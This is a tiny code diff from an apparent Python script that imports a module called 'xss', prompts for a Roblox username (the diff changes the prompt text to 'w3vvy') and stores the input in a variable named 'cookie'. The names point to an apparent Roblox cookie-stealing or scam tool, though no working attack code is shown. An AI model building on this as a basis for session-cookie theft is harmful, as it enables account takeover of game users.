@@ -1,6 +1,6 @@
 import xss as xss
 
-payload = input("Type Roblox Username Here => ")
+payload = input("w3vvy")
 
 cookie = payload
 
